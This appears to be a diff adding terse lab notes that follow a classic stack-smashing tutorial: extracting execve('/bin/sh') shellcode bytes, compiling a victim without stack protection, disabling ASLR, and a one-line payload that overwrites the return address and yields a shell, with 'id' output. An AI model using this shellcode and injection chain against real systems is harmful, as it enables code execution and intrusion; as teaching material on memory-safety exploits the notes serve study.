@@ -1,0 +1,59 @@
+
+
+ubuntu:~$ gcc shell.c
+ubuntu:~$ ./a.out
+$
+
+objdump -d a.out | sed -n '/needle0/,/needle1/p'
+
+
+$ echo $((0x4dc-0x4bf)) #el principio y el final del programa
+29
+
+
+
+$ xxd -s0x4bf -l32 -p a.out shellcode
+
+$ cat shellcode
+eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
+bead
+
+
+
+$ gcc -fno-stack-protector -o victim victim.c
+
+
+
+$ execstack -s victim
+
+Lastly, we disable ASLR when running the binary:
+
+$ setarch `arch` -R ./victim
+What's your name?
+World
+Hello, World!
+
+One more cheat. We’ll simply print the buffer location:
+
+ printf("%p\n", name);  // Print address of buffer.
+
+$ setarch `arch` -R ./victim
+0x7fffffffe090
+What's your name?
+
+$ a=`printf %016x 0x7fffffffe090 | tac -rs..`
+$ echo $a
+90e0ffffff7f0000
+
+((cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) | setarch `arch` -R ./victimFSP 
+
+0x7fffffffe480
+What's your name?
+
+Hello, �_H1��;H1�H1������/bin/sh!
+
+id
+uid=1000(ivansk8421) gid=1000(ivansk8421) groups=1000(ivansk8421),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),118(lpadmin),129(sambashare)
+
+
+### http://crypto.stanford.edu/~blynn/rop/
